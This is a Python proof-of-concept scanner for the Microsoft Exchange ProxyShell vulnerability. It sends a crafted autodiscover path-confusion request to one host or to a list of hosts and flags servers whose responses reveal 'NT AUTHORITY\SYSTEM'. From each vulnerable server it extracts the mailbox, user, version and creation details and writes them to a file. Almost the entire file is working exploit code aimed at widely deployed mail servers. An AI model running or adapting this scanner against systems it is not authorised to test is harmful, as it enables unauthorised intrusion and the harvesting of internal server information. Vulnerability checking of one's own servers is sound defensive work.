from concurrent.futures import ThreadPoolExecutor
import argparse
import requests
import re
from datetime import datetime
import colorama

requests.packages.urllib3.disable_warnings()
colorama.init(autoreset = True)





def main():
    
    if len(input_domain) >= 1:
        
        input_url = input_domain
        start_poc(input_domain)

    else:
    
        http = "https://"
        with open(input_file, "r") as myfile:
            content = myfile.readlines()

            with ThreadPoolExecutor(max_workers=1) as executor:
                for url in content:
                    if url.startswith("http"):
                        http = ""
                    # only use url and not banner
                    if "," in url:
                        url_array = url.split(",")
                        url = url_array[0]
                    executor.submit(start_poc, http + url.strip())

def start_poc(input_url):
    try:
        session = requests.session()
        session.headers[
            "User-Agent"
        ] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 POCTEST"
        # only keep domain
        url_array = input_url.split("/")
        url = "/".join(url_array[0:3])
        
        poc_url = url + "/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com"
        
        response = session.get(poc_url,timeout=5,verify=False)
             
        print(colorama.Fore.YELLOW + "\nChecking Host: " + url)
        
        session.close()

        if response.status_code == 200:
            if "NT AUTHORITY\\SYSTEM" in response.text or "Connectivity Endpoint" in response.text:
                print(colorama.Fore.RED + url + " is vulnerable!")
                mailbox = ""
                created = ""
                user = ""
                version = ""
                try:
                    mailbox = re.search("Mailbox:.*?</p>", response.text).group().replace("</b>", "").replace("</p>", "")
                    created = re.search("Created:.*?</p>", response.text).group().replace("</b>", "").replace("</p>", "")
                    user = re.search("User:.*?<br>", response.text).group().replace("</b>", "").replace("<br>", "")
                    version = re.search("Version:.*?<br>", response.text).group().replace("<br>", "")
                except:
                    print("No mailbox found...")

                output_string = f"{url}, {mailbox}, {user}, {version}, {created}, localtime: {str(datetime.now())}\n"
                print(colorama.Fore.RED + output_string)
                with open(output_file, "a") as my_file:
                    my_file.write(output_string)
            else:
                
                print(colorama.Fore.GREEN + "no vuln text match found.")

        else:
            
            print(colorama.Fore.GREEN + url + " Recieved Status Code: " + str({response.status_code}))
            if response.headers.get("x-owa-version"):
                print(f"{colorama.Fore.GREEN}OWA: {response.headers.get('x-owa-version')}")

        
            
    except requests.exceptions.ConnectionError:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Check websites for exchange proxyshell vulnerability."
    )
    parser.add_argument(
        "-i", type=str, default="./input.txt", help="Path to input file"
    )
    parser.add_argument(
        "-o", type=str, default="./output.txt", help="Path to output file"
    )
    parser.add_argument(
        "-d", type=str, default="", help="Exchange Server URL to check"
    )
    args = parser.parse_args()
    input_file = args.i
    output_file = args.o
    input_domain = args.d
    main()
